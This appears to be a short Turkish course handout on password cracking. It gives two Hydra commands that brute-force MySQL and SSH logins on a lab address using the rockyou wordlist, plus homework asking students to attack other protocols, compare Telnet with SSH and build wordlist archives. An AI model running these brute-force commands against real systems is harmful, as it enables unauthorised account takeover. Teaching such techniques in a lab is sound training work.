# Sifre Kirma

## Komutlar

```
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.3.7 -e nsr
hydra -L usernames.txt -P passwords.txt ssh://10.0.3.7 -t 32
```

## Ödevler

- Şifre kırma saldırılarını farklı protokoller için de deneyiniz.
- Telnet protokolüne gerçekleştirilecek şifre kırma saldırılarının SSH'a göre neden stabil olmadığını araştırınız.
- Hydra dışında diğer şifre kırma araçlarını deneyiniz.
- İnternet üzerinden çeşitli wordlistleri araştırınız ve kendi arşivinizi yapınız.
